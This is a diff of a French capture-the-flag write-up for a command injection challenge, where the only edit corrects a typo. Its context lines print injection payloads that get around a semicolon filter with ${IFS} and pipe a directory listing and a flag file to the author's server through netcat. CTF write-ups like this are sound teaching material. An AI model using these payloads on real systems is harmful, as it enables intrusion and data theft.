@@ -51,7 +51,7 @@ if(isset($_POST['submit']) && isset($_POST['ip']) && !empty($_POST['ip'])){
 
 ## DéDéOS 3 - 50 pts
 
-Cette fois-ci `;ls;` ne passe pas car les `;` sont interdits. Compte tenu de la structure de la commande, je pense qu'il n'y a que 2 solutions : une injections en blind en jouant avec le code de retour (très long et on est pas dans du misc) ou alors exfiltrer des données avec netcat par exemple.
+Cette fois-ci `;ls;` ne passe pas car les `;` sont interdits. Compte tenu de la structure de la commande, je pense qu'il n'y a que 2 solutions : une injection en blind en jouant avec le code de retour (très long et on est pas dans du misc) ou alors exfiltrer des données avec netcat par exemple.
 
 Je lance netcat en écoute sur le port 2020 de mon VPS puis j'injecte `||ls${IFS}-laR|nc${IFS}ribt.fr${IFS}2020`. Je récupère bien la liste des fichiers et `||cat${IFS}.secret/2/1/3/flag.txt|nc${IFS}ribt.fr${IFS}2020` me permet de récupérer le flag.
 
